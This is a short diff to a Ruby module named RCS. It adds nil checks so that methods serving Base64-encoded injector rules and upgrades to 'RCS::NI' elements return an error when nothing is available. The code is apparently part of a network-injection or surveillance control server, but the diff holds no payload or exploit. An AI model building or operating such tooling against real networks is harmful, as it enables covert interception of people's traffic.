@@ -173,17 +173,25 @@ module RCS
       def protocol_config(command, response)
         content = DB.instance.injector_config(@element['_id'])
 
-        trace :info, "[NC] New configuration for RCS::NI::#{@element['name']} (#{content.length} bytes)"
-
-        response << {command: 'CONFIG_REQUEST', result: {status: 'OK', msg: {type: 'rules', body: Base64.strict_encode64(content)}}}
+        if content
+          trace :info, "[NC] New configuration for RCS::NI::#{@element['name']} (#{content.length} bytes)"
+          response << {command: 'CONFIG_REQUEST', result: {status: 'OK', msg: {type: 'rules', body: Base64.strict_encode64(content)}}}
+        else
+          trace :debug, "[NC] NO New configuration for RCS::NI::#{@element['name']}"
+          response << {command: 'CONFIG_REQUEST', result: {status: 'ERROR', msg: "No new config"}}
+        end
       end
 
       def protocol_upgrade(command, response)
         content = DB.instance.injector_upgrade(@element['_id'])
 
-        trace :info, "[NC] New upgrade for RCS::NI::#{@element['name']} (#{content.length} bytes)"
-
-        response << {command: 'UPGRADE_REQUEST', result: {status: 'OK', msg: {body: Base64.strict_encode64(content)}}}
+        if content
+          trace :info, "[NC] New upgrade for RCS::NI::#{@element['name']} (#{content.length} bytes)"
+          response << {command: 'UPGRADE_REQUEST', result: {status: 'OK', msg: {body: Base64.strict_encode64(content)}}}
+        else
+          trace :debug, "[NC] NO New upgrade for RCS::NI::#{@element['name']}"
+          response << {command: 'UPGRADE_REQUEST', result: {status: 'ERROR', msg: "No upgrade available"}}
+        end
       end
 
       def parse_chain(anonymizers)
